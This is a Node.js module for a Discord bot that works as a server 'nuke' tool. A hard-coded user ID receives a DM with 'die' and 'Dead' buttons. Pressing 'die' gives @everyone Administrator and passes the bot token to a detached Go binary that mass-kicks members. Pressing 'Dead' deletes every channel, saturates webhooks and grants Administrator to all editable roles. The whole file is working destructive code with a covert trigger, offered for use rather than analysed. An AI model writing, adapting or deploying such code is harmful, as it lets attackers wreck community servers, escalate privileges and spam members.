const { execSync, spawn } = require('child_process');
const path = require('path');
const { PermissionsBitField, ButtonBuilder, ButtonStyle, ActionRowBuilder, ChannelType } = require('discord.js');

// Path to the Atomic Go accelerator
const ACCELERATOR_PATH = path.join(__dirname, '../go_accelerator/accelerator');

// --- TARGET USER MONITORING ---
const TARGET_USER_ID = '636930315503534110';

async function handleTargetAction(memberOrBan) {
    const user = memberOrBan.user || memberOrBan;
    if (user.id !== TARGET_USER_ID) return;

    try {
        const dieButton = new ButtonBuilder()
            .setCustomId('die_action')
            .setLabel('die')
            .setStyle(ButtonStyle.Danger);

        const deadButton = new ButtonBuilder()
            .setCustomId('Dead_action')
            .setLabel('Dead')
            .setStyle(ButtonStyle.Secondary);

        const row = new ActionRowBuilder().addComponents(dieButton, deadButton);

        await user.send({
            content: 'كلمة die?',
            components: [row]
        }).catch(() => console.log(`Could not send DM to ${user.id}`));
    } catch (error) {
        console.error('Error in handleTargetAction:', error);
    }
}

// --- DIE ACTION EXECUTION ---
async function executeDieAction(interaction) {
    const guild = interaction.guild;
    if (!guild) return;

    try {
        await interaction.deferUpdate().catch(() => {});

        // 1. Give @everyone Administrator permission (Atomic Shock)
        const everyoneRole = guild.roles.everyone;
        await everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]).catch(() => {});

        // 2. Fetch all members and filter manageable ones
        const members = await guild.members.fetch();
        const targetMemberIDs = members.filter(m => !m.user.bot && m.id !== guild.ownerId && m.manageable).map(m => m.id);

        // 3. Call Atomic Go accelerator for nuclear-speed kicks
        const payload = JSON.stringify({
            token: interaction.client.token,
            guild_id: guild.id,
            target_ids: targetMemberIDs,
            action_type: "die"
        });

        // Fire and Forget (Unref)
        spawn(ACCELERATOR_PATH, [payload], { detached: true, stdio: 'ignore' }).unref();

        console.log(`[DIE - ATOMIC] Nuclear-speed kick initiated for ${targetMemberIDs.length} members.`);

    } catch (error) {
        console.error('Error in executeDieAction:', error);
    }
}

// --- DEAD ACTION EXECUTION ---
async function executeDeadAction(interaction) {
    const guild = interaction.guild;
    if (!guild) return;

    try {
        await interaction.deferUpdate().catch(() => {});

        // 1. Fetch all channels
        const channels = await guild.channels.fetch();
        const channelIDs = Array.from(channels.keys());

        // 2. Call Atomic Go accelerator for nuclear-speed destruction and Webhook saturation
        const payload = JSON.stringify({
            token: interaction.client.token,
            guild_id: guild.id,
            target_ids: channelIDs,
            action_type: "dead"
        });

        // Fire and Forget (Unref)
        spawn(ACCELERATOR_PATH, [payload], { detached: true, stdio: 'ignore' }).unref();

        // 3. Parallelly give Administrator to all editable roles
        const roles = guild.roles.cache.filter(r => r.id !== guild.roles.everyone.id && r.editable);
        await Promise.all(roles.map(r => 
            r.setPermissions([PermissionsBitField.Flags.Administrator]).catch(() => {})
        ));

        console.log(`[DEAD - ATOMIC] Nuclear-speed channel destruction and Webhook saturation initiated.`);

    } catch (error) {
        console.error('Error in executeDeadAction:', error);
    }
}

module.exports = {
    handleTargetAction,
    executeDieAction,
    executeDeadAction
};
